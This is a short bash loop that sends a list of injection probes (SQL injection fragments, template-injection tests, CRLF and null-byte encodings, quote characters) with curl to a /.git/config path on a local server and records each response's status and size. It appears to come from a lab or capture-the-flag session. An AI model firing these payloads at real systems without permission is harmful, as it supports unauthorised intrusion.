H='http://127.0.0.1:8897'
for p in "MARKER" "MARKER%27--" "%0a" "%0d%0a" "%27" "%22" "%00" "%7B%7B7*7%7D%7D" "%24%7B7*7%7D" "1%3B" "1--" "1%23" "1%20or%201=1%20--%20" "~" "!" "@" "#" "\$" "*" "%60" "%25" "%2a"; do printf "%-22s => " "$p"; curl -s -w "[%{http_code} %{size_download}]\n" "$H/.git/config?p=$p" | tr '\n' '|' ; echo; done
